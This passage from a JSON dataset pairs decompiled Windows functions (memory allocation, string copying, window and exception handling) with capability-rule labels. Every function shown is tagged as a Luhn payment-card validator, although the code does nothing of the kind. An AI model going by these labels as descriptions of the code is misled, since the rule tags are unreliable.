8))(*(unaff_EBP + -0x14));\n        fcn.00407b42();\n        puVar4 = fcn.0041bd04(0x1c);\n        if (puVar4 == NULL) {\n            puVar4 = NULL;\n        }\n        else {\n            *puVar4 = 0;\n            puVar4[1] = 0;\n            puVar4[2] = 0;\n            puVar4[3] = 0;\n            puVar4[4] = 0;\n            puVar4[5] = 0;\n        }\n        extraout_ECX[0x15] = puVar4;\n        fcn.00407b57(*extraout_ECX[0x14]);\n        *(extraout_ECX[0x14] + 8) = extraout_ECX[0x15];\n        iVar3 = *(extraout_ECX[0x15] + 0xc);\n        extraout_ECX[4] = iVar3;\n        iVar3 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(iVar3 * 0x28);\n        extraout_ECX[5] = iVar3;\n        fcn.0040b990(iVar3, 0, extraout_ECX[4] * 0x28);\n        fcn.00407a6f();\n        fcn.00407499();\ncode_r0x00407965:\n        iVar3 = extraout_ECX[4];\n        *(unaff_EBP + -0x14) = 0;\n        if (0 < iVar3) {\n            iVar3 = 0;\n            do {\n                uVar6 = 0x1c;\n                iVar5 = fcn.0041bd04(0x1c);\n                *(unaff_EBP + -0x18) = iVar5;\n                *(unaff_EBP + -4) = 1;\n                if (iVar5 == 0) {\n                    uVar6 = 0;\n                }\n                else {\n                    uVar6 = fcn.0041b65a(uVar6, 10);\n                }\n                iVar5 = extraout_ECX[5];\n                *(unaff_EBP + -4) = 0xffffffff;\n                *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n                *(iVar3 + 0x24 + iVar5) = uVar6;\n                iVar3 = iVar3 + 0x28;\n            } while (*(unaff_EBP + -0x14) < extraout_ECX[4]);\n        }\n        if (*(unaff_EBP + -0x28) != 0) {\n            if (0 < *(unaff_EBP + -0x2c)) {\n                *(unaff_EBP + -0x18) = *(unaff_EBP + -0x2c);\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x28) + 0x24;\n                do {\n                    puVar4 = *(**(unaff_EBP + -0x10) + 4);\n                    while (puVar4 != NULL) {\n                        puVar2 = *puVar4;\n                        (**(*extraout_ECX + 8))(puVar4[2], 1);\n                        puVar4 = puVar2;\n                    }\n                    fcn.0041b699();\n                    if (**(unaff_EBP + -0x10) != NULL) {\n                        (**(***(unaff_EBP + -0x10) + 4))(1);\n                    }\n                    *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 0x28;\n                    piVar1 = unaff_EBP + -0x18;\n                    *piVar1 = *piVar1 + -1;\n                } while (*piVar1 != 0);\n            }\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(*(unaff_EBP + -0x28));\n        }\n    }\n    iVar3 = *(unaff_EBP + -0x20);\ncode_r0x00407a0f:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar3;\n}\n",
        "token_count": 2604
    },
    "00407b42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407b42(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *param_1;\n    if (puVar1 != NULL) {\n        (***puVar1)(puVar1, 0x449eb8, param_1 + 1);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "00407e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00407e08(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    uint var_14h;\n    uint var_ch;\n    \n    fcn.0040b7d8();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *extraout_ECX = 0;\n    extraout_ECX[1] = iVar1;\n    iVar1 = fcn.0041bd04(iVar1 << 3);\n    *extraout_ECX = iVar1;\n    iVar1 = *extraout_ECX;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar1 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 321
    },
    "00408af3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00408af3(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    uVar2 = fcn.004080d5(&param_2);\n    if (uVar2 == '\\0') {\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    else {\n        iVar3 = unaff_retaddr * 0x30 + *(param_1 + 0x10);\n        uVar2 = *(iVar3 + 0x10);\n        uVar1 = *(*(iVar3 + 4) + (uVar2 & 3) + *(param_1 + 8) + 4 + uVar2);\n        *param_2 = uVar1;\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 219
    },
    "00408b37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00408b37(int32_t param_1, int32_t param_2)\n\n{\n    return *(param_2 * 0x30 + 4 + *(param_1 + 0x10)) + *(param_1 + 8);\n}\n",
        "token_count": 64
    },
    "00409694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00409694(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    uVar2 = *(extraout_ECX + 0xc);\n    *(extraout_ECX + 8) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(extraout_ECX + 0x18) = *(unaff_EBP + 0x10);\n    *(extraout_ECX + 0x10) = iVar1;\n    *(extraout_ECX + 0x14) = 0;\n    fcn.0041bd2d(uVar2);\n    *(extraout_ECX + 0xc) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar2 = fcn.0041bd04(iVar1 * 0x34);\n    *(extraout_ECX + 0xc) = uVar2;\n    iVar1 = *(extraout_ECX + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return (-(iVar1 != 0) & 0x7ff8fff2) + 0x8007000e;\n}\n",
        "token_count": 449
    },
    "0040970b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040970b(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        arg_1ch = 0;\n    }\n    else {\n        arg_1ch = arg_1ch - *(in_ECX + 8);\n    }\n    if (arg_18h == 0) {\n        arg_18h = 0;\n    }\n    else {\n        arg_18h = arg_18h - *(in_ECX + 8);\n    }\n    fcn.00407eae(*(in_ECX + 0x14) * 0x34 + *(in_ECX + 0xc), arg_8h, arg_ch, arg_10h, 0, 0, 0, arg_14h - *(in_ECX + 8), \n                 arg_18h, arg_1ch, 0);\n    *(in_ECX + 0x14) = *(in_ECX + 0x14) + 1;\n    return;\n}\n",
        "token_count": 268
    },
    "00409b97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409b97(uint32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((arg_8h & 3) == 0) || (uVar1 = 0,  arg_ch == 0)) {\n        return 0;\n    }\ncode_r0x00409bb5:\n    // switch table (31 cases) at 0x409c1c\n    switch(*arg_10h) {\n    case 1:\n        var_4h = 3;\n        break;\n    case 2:\n    case 0x14:\n        var_4h = 5;\n        break;\n    case 3:\n    case 9:\n    case 10:\n    case 0x17:\n        var_4h = 6;\n        break;\n    default:\n        goto code_r0x00409bcb;\n    case 6:\n    case 7:\n    case 8:\n    case 0xb:\n    case 0xc:\n    case 0xf:\n    case 0x10:\n    case 0x13:\n    case 0x15:\n        var_4h = 7;\n        break;\n    case 0x18:\n        var_4h = 2;\n        break;\n    case 0x19:\n        var_4h = 1;\n        break;\n    case 0x1f:\n        var_4h = 4;\n    }\n    fcn.00409f08(3);\n    var_8h = arg_14h;\n    fcn.004061bd(&var_24h);\n    return var_ch;\ncode_r0x00409bcb:\n    uVar1 = uVar1 + 1;\n    arg_10h = arg_10h + 9;\n    if (arg_ch <= uVar1) {\n        return 0;\n    }\n    goto code_r0x00409bb5;\n}\n",
        "token_count": 465
    },
    "0040a322": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a322(int32_t param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_retaddr;\n    \n    if (*(param_1 + 0x38) != 0) {\n        fcn.00405d33(param_2);\n        return;\n    }\n    uVar1 = fcn.00409f2b(param_1, 0);\n    if (((-(unaff_retaddr != 0) & 0x10U) + 0x10 & uVar1) != 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0xf4, unaff_retaddr != 0, 1);\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "0040a913": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a913(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFileException.0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041d2bd(extraout_ECX);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 148
    },
    "0040aa9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040aa9d(uint32_t lpMultiByteStr, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_ECX;\n    uint32_t uStack20;\n    uint var_ch;\n    \n    *(in_ECX + 4) = 0;\n    *in_ECX = 8;\n    if (lpMultiByteStr != 0) {\n        uStack20 = lpMultiByteStr;\n        if (arg_ch == 0xe) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            iVar2 = (*_sym.imp.OLEAUT32.dll_DllRegisterServer)(lpMultiByteStr, uVar1);\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n            fcn.0040b610();\n            uStack20 = uStack20 & 0xffff0000;\n            (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &uStack20, iVar2 + 1);\n            iVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(&uStack20);\n        }\n        *(in_ECX + 4) = iVar2;\n        if (iVar2 == 0) {\n            fcn.0041b368();\n        }\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0040abd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040abd5(uint param_1)\n\n{\n    fcn.0040b990(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 39
    },
    "0040aeac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040aeac(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 <= *0x44a5f4) {\n        fcn.0040d20a(9);\n        iVar1 = fcn.0040d614(param_1);\n        fcn.0040d26b(9);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44f15c, 0, param_1 + 0xf & 0xfffffff0);\n    return iVar1;\n}\n",
        "token_count": 169
    },
    "0040b942": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b942(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    \n    if (param_1 != 0) {\n        fcn.0040d20a(9);\n        arg_8h = fcn.0040d2be(param_1);\n        if (arg_8h != 0) {\n            fcn.0040d2e9(arg_8h, param_1);\n            fcn.0040d26b(9);\n            return;\n        }\n        fcn.0040d26b(9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44f15c, 0, param_1);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0040cca9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040cca9(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.0040cd25();\n    iVar3 = 0;\n    *puVar1 = param_1;\n    puVar1 = 0x44a308;\n    do {\n        if (param_1 == *puVar1) {\n            puVar2 = fcn.0040cd1c();\n            *puVar2 = *(iVar3 * 8 + 0x44a30c);\n            return;\n        }\n        puVar1 = puVar1 + 2;\n        iVar3 = iVar3 + 1;\n    } while (puVar1 < 0x44a470);\n    if ((0x12 < param_1) && (param_1 < 0x25)) {\n        puVar2 = fcn.0040cd1c();\n        *puVar2 = 0xd;\n        return;\n    }\n    if ((0xbb < param_1) && (param_1 < 0xcb)) {\n        puVar2 = fcn.0040cd1c();\n        *puVar2 = 8;\n        return;\n    }\n    puVar2 = fcn.0040cd1c();\n    *puVar2 = 0x16;\n    return;\n}\n",
        "token_count": 306
    },
    "004112c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid fcn.004112c7(uint param_1)\n\n{\n    uint var_4h_2;\n    \n    fcn.004112d8(param_1, 0, 4);\n    return;\n}\n",
        "token_count": 65
    },
    "0040f290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040f290(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x0040f2df;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x0040f2f1;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x0040f2f1;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x0040f2f1;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x0040f2df:\n    puVar5 = puVar3 + -1;\ncode_r0x0040f2f1:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040f368;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x0040f368:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 762
    },
    "0040f280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040f280(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x0040f368;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x0040f368:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "00411ffb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411ffb(uint param_1, uint param_2)\n\n{\n    fcn.00411e8f(param_1, param_2, 0x44af60);\n    return;\n}\n",
        "token_count": 47
    },
    "00412011": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412011(uint param_1, uint param_2)\n\n{\n    fcn.00411e8f(param_1, param_2, 0x44af78);\n    return;\n}\n",
        "token_count": 47
    },
    "00412027": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412027(uint arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.00412b62(&var_ch, &arg_ch, arg_ch, 0, 0, 0, 0);\n    fcn.00411ffb(&var_ch, arg_8h);\n    return;\n}\n",
        "token_count": 78
    },
    "00412054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412054(uint arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.00412b62(&var_ch, &arg_ch, arg_ch, 0, 0, 0, 0);\n    fcn.00412011(&var_ch, arg_8h);\n    return;\n}\n",
        "token_count": 78
    },
    "004145d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004145d1(code **param_1)\n\n{\n    uint *puVar1;\n    \n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (param_1[0xd] != NULL) {\n        puVar1 = fcn.00414598();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "004153b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004153b5(code **param_1)\n\n{\n    uint *puVar1;\n    \n    *param_1 = vtable.std::basic_streambuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    if (param_1[0xd] != NULL) {\n        puVar1 = fcn.00414598();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00415dba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00415dba(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041a6a4(iVar2);\n    uVar1 = *(iVar2 + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = uVar1;\n    fcn.004024b0(0);\n    fcn.004022b0(iVar2 + 0xc, 0, *0x4295b4);\n    uVar3 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::logic_error.0;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 312
    },
    "004161f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.004161f6(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0041a6a4(iVar2);\n    uVar1 = *(iVar2 + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = uVar1;\n    fcn.004024b0(0);\n    fcn.004022b0(iVar2 + 0xc, 0, *0x4295b4);\n    uVar3 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::runtime_error.0;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 313
    },
    "00416b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416b70(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0x44f424;\n    do {\n        fcn.00416b50(uVar1);\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x44f430);\n    fcn.00416b50(0x44f430);\n    return;\n}\n",
        "token_count": 94
    },
    "00416d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416d10(uint param_1, int32_t *param_2, uint16_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    iStack16 = *param_2;\n    iStack12 = param_2[1];\n    uStack8 = param_2[2];\n    uStack4 = param_2[3];\n    uVar1 = uStack8 & 0xffff0000;\n    fcn.00416bd0(param_1, &iStack16, 7, 1, uStack4 & 0xffff0000 | param_3 & 0xffff000f);\n    iStack16 = iStack16 + -1;\n    iStack12 = iStack12 + -1;\n    uStack8 = uStack8 + 1;\n    uStack4 = uStack4 + 1;\n    fcn.00416bd0(param_1, &iStack16, 2, 0, uVar1 | param_3);\n    return;\n}\n",
        "token_count": 255
    },
    "00416d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416d80(uint param_1)\n\n{\n    uint unaff_retaddr;\n    uint *puVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    puVar1 = &uStack16;\n    (*_sym.imp.USER32.dll_GetClientRect)(param_1, &uStack16);\n    (*_sym.imp.GDI32.dll_IntersectClipRect)(unaff_retaddr, param_1, puVar1, uStack16, uStack12);\n    return;\n}\n",
        "token_count": 111
    },
    "004170f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004170f0(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    iVar3 = 0;\n    if (0 < *0x44f43c) {\n        piVar2 = 0x44f444;\n        do {\n            if (*piVar2 == iVar1) {\n                return 1;\n            }\n            piVar2 = piVar2 + 5;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *0x44f43c);\n    }\n    return 0;\n}\n",
        "token_count": 151
    },
    "004180d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004180d0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.004168a0(param_1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (0x35e < *0x44f400) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff0);\n        if ((uVar2 & 4) != 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 136
    },
    "00418650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418650(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    \n    uStack32 = 0xfffffff0;\n    uStack36 = param_1;\n    puStack40 = 0x418663;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    puStack40 = &stack0xffffffe8;\n    uStack44 = param_1;\n    uStack48 = 0x418671;\n    (*_sym.imp.USER32.dll_GetWindowRect)();\n    puStack56 = &stack0xffffffe0;\n    uStack48 = 1;\n    uStack52 = 1;\n    uStack60 = 0x418680;\n    (*_sym.imp.USER32.dll_InflateRect)();\n    uStack60 = param_1;\n    puStack64 = 0x418687;\n    uVar3 = (*_sym.imp.USER32.dll_GetParent)();\n    pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n    puStack64 = &stack0xffffffd0;\n    (*_sym.imp.USER32.dll_ScreenToClient)(uVar3);\n    (*pcVar1)(uVar3, &stack0xffffffd0);\n    if ((uVar2 & 0x200000) != 0) {\n        puStack56 = puStack56 + 1;\n    }\n    (*_sym.imp.USER32.dll_ValidateRect)(uVar3, &stack0xffffffc0);\n    return;\n}\n",
        "token_count": 392
    },
    "0041a042": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a042(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    fcn.0041188f(arg_14h);\n    uVar1 = fcn.0041a071(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.004118e1(arg_14h);\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "0041b368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
